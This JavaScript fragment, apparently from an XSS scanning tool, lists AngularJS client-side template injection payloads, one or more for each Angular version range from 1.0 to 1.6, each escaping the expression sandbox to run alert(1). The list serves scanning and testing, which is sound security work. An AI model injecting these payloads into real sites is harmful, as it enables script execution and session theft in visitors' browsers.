// http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html 1.0.0 to 1.6.0+
xssRadar.scanner.payloads.extendedangular = [
    //1.0.1 - 1.1.5
    "{{constructor.constructor('alert(1)')()}}",
    //1.2.0 - 1.2.1
    "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
    // 1.2.2 - 1.2.5
    "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'\");}}",
    //1.2.6 - 1.2.18
    "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}",
    //1.2.19 - 1.2.23
    '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}',
    //1.2.24 - 1.2.29
    "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'\");}}",
    //1.3.0
    "{{!ready && (ready = true) && (!call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString('F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )));}}",
    //1.3.1 - 1.3.2
    "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//'); }}",
    //1.3.3 - 1.3.18
    "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');  }}",
    //1.3.19
    "{{ 'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; $eval('x=alert(1)//'); }}",
    //1.3.20
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
    //1.4.0 - 1.4.9
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
    //1.5.0 - 1.5.8
    "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
    //1.5.9 - 1.5.11
    "{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};\");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}",
    //>=1.6.0
    "{{constructor.constructor('alert(1)')()}}"
    ]